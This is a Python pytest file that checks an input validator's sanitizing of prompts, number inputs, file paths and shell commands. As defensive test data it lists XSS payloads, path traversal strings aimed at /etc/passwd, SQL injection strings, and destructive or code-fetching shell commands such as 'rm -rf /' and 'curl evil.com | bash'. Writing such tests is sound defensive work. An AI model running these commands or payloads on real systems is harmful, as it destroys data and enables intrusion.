import pytest
from pathlib import Path
from aysekai.utils.validators import InputValidator
from aysekai.core.exceptions import ValidationError


class TestInputValidator:
    """Test input validation and sanitization"""
    
    def test_sanitize_prompt_basic(self):
        """Test basic prompt sanitization"""
        # Normal input
        assert InputValidator.sanitize_prompt("Hello world") == "Hello world"
        
        # Empty input
        assert InputValidator.sanitize_prompt("") == ""
        assert InputValidator.sanitize_prompt(None) == ""
        
        # Whitespace
        assert InputValidator.sanitize_prompt("  hello  ") == "hello"
    
    def test_sanitize_prompt_length_limit(self):
        """Test prompt length limiting"""
        long_prompt = "x" * 1000
        result = InputValidator.sanitize_prompt(long_prompt)
        
        assert len(result) <= InputValidator.MAX_PROMPT_LENGTH
        assert len(result) == 500
    
    def test_sanitize_prompt_html_removal(self):
        """Test HTML/script tag removal"""
        dangerous_inputs = [
            "<script>alert('xss')</script>Hello",
            "Hello<img src=x onerror=alert('xss')>",
            "<div onclick='evil()'>Click me</div>",
            "Normal text <b>with tags</b>",
        ]
        
        expected = [
            "alert('xss')Hello",
            "Hello",
            "Click me",
            "Normal text with tags",
        ]
        
        for dangerous, clean in zip(dangerous_inputs, expected):
            assert InputValidator.sanitize_prompt(dangerous) == clean
    
    def test_sanitize_prompt_control_chars(self):
        """Test control character removal"""
        # Control characters should be removed
        text_with_control = "Hello\x00\x01\x02World\x1f"
        assert InputValidator.sanitize_prompt(text_with_control) == "HelloWorld"
        
        # Newlines and carriage returns become spaces
        text_with_newlines = "Hello\nWorld\rTest"
        assert InputValidator.sanitize_prompt(text_with_newlines) == "Hello World Test"
    
    def test_sanitize_prompt_csv_escaping(self):
        """Test CSV special character escaping"""
        # Quotes should be escaped
        assert InputValidator.sanitize_prompt('Hello "World"') == 'Hello ""World""'
        
        # Already escaped quotes
        assert InputValidator.sanitize_prompt('Say ""Hi""') == 'Say """"Hi""""'
    
    def test_sanitize_prompt_arabic_support(self):
        """Test Arabic text is preserved"""
        arabic_text = "السلام عليكم"
        assert InputValidator.sanitize_prompt(arabic_text) == arabic_text
        
        # Mixed Arabic and English
        mixed = "Hello مرحبا World"
        assert InputValidator.sanitize_prompt(mixed) == mixed
    
    def test_sanitize_prompt_emoji_handling(self):
        """Test emoji handling"""
        # Emojis should be preserved
        emoji_text = "Hello 🌙 World 🕌"
        assert InputValidator.sanitize_prompt(emoji_text) == emoji_text
    
    def test_validate_number_input_valid(self):
        """Test valid number validation"""
        # Valid numbers
        assert InputValidator.validate_number_input("1") == 1
        assert InputValidator.validate_number_input("50") == 50
        assert InputValidator.validate_number_input("99") == 99
        
        # With whitespace
        assert InputValidator.validate_number_input(" 42 ") == 42
    
    def test_validate_number_input_invalid(self):
        """Test invalid number validation"""
        # Out of range
        assert InputValidator.validate_number_input("0") is None
        assert InputValidator.validate_number_input("100") is None
        assert InputValidator.validate_number_input("-1") is None
        
        # Not numbers
        assert InputValidator.validate_number_input("abc") is None
        assert InputValidator.validate_number_input("") is None
        assert InputValidator.validate_number_input(None) is None
        assert InputValidator.validate_number_input("12.5") is None
    
    def test_validate_file_path_allowed(self):
        """Test file path validation for allowed paths"""
        allowed_dirs = ["/app/data", "/app/config"]
        
        # Allowed paths
        assert InputValidator.validate_file_path(
            Path("/app/data/file.csv"), allowed_dirs
        ) is True
        
        assert InputValidator.validate_file_path(
            Path("/app/config/settings.json"), allowed_dirs
        ) is True
        
        # Subdirectories should be allowed
        assert InputValidator.validate_file_path(
            Path("/app/data/processed/names.csv"), allowed_dirs
        ) is True
    
    def test_validate_file_path_blocked(self):
        """Test file path validation blocks unauthorized paths"""
        allowed_dirs = ["/app/data"]
        
        # Outside allowed directories
        assert InputValidator.validate_file_path(
            Path("/etc/passwd"), allowed_dirs
        ) is False
        
        assert InputValidator.validate_file_path(
            Path("/app/secrets/key.pem"), allowed_dirs
        ) is False
        
        # Parent directory access attempt
        assert InputValidator.validate_file_path(
            Path("/app/data/../secrets/key.pem"), allowed_dirs
        ) is False
    
    def test_validate_file_path_traversal(self):
        """Test path traversal prevention"""
        allowed_dirs = ["/app/data"]
        
        # Various traversal attempts
        traversal_attempts = [
            "/app/data/../../etc/passwd",
            "/app/data/../data/../../etc/passwd",
            "/app/data/./../../system",
            "/app/data/%2e%2e/secrets",  # URL encoded
        ]
        
        for path in traversal_attempts:
            assert InputValidator.validate_file_path(
                Path(path), allowed_dirs
            ) is False
    
    def test_validate_command_safe(self):
        """Test command validation for safe commands"""
        safe_commands = [
            "ls -la",
            "pwd",
            "echo 'Hello World'",
            "date +%Y-%m-%d",
        ]
        
        for cmd in safe_commands:
            assert InputValidator.validate_command(cmd) is True
    
    def test_validate_command_dangerous(self):
        """Test command validation blocks dangerous commands"""
        dangerous_commands = [
            "rm -rf /",
            "curl evil.com | bash",
            "eval $(echo danger)",
            "; cat /etc/passwd",
            "|| wget malware.exe",
            "` malicious `",
            "$( dangerous )",
        ]
        
        for cmd in dangerous_commands:
            assert InputValidator.validate_command(cmd) is False
    
    def test_sql_injection_prevention(self):
        """Test SQL injection pattern detection"""
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM names WHERE 1=1",
        ]
        
        for injection in sql_injections:
            sanitized = InputValidator.sanitize_prompt(injection)
            # Should not contain SQL keywords after sanitization
            assert "DROP" not in sanitized.upper()
            assert "DELETE" not in sanitized.upper()